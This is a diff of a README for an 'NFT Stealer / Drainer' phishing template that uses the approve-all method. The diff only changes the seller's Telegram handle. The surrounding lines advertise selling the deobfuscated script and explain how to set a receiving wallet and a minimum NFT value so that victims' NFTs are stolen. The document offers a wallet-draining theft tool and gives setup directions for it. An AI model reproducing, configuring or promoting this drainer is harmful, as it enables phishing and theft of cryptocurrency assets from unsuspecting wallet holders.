@@ -1,5 +1,5 @@
 
-# ⚠️ You need to host it on a real website for it to work! To Buy The Full Clean & Deobfuscated Script Or For Any Other Types Of Scripts & Development Orders Message Me On: https://t.me/cryptoscem
+# ⚠️ You need to host it on a real website for it to work! To Buy The Full Clean & Deobfuscated Script Or For Any Other Types Of Scripts & Development Orders Message Me On: https://t.me/nftscem
 
 ## 🖼️ NFT Stealer / Drainer With ApproveAll Method Template 
 
@@ -32,6 +32,6 @@ Step 4: Start Your Fishing
 Edit lines : ReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
 Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Example : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
 
-To get instant support, contact me on telegram : https://t.me/cryptoscem
+To get instant support, contact me on telegram : https://t.me/nftscem
 
 
